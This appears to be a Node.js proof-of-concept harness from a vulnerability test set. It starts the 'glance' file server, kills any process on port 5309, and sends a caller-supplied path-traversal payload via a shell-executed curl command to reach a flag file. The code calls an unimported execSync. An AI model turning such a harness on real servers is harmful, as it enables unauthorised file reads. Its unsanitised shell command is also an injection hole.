const path = require("path");
const { sleep } = require("sleep");
const { exec } = require("child_process");

function exploitFunction(payload) {
  const pathToFlag = path.resolve(__dirname, "../flag.html");

  const http = require("http");
  const glance = require("glance");
  const fs = require("fs");

  try {
    execSync("fuser -k 5309/tcp", () => {});
  } catch (e) {}

  var g = glance({
    dir: "./",
    port: 8969,
    indices: [],
    hideindex: true,
    nodot: true,
    verbose: true,
  });

  http
    .createServer(function (req, res) {
      if (/^\/static\//.test(req.url)) {
        return g.serveRequest(req, res);
      }
    })
    .listen(5309);

  g.start();

  g.on("read", function (req) {
    console.dir(req);
  });

  g.on("error", function (req) {
    console.log("BAD!!!!");
    g.stop();
  });

  // Wait for the server to start
  sleep.sleep(1);

  // Send the attack request
  const attack_string = `curl -v --path-as-is "http://127.0.0.1:8969${payload}"`;
  const { exec } = require("child_process");
  exec(attack_string, (error, stdout) => {
    return stdout;
  });
}

module.exports = { exploitFunction };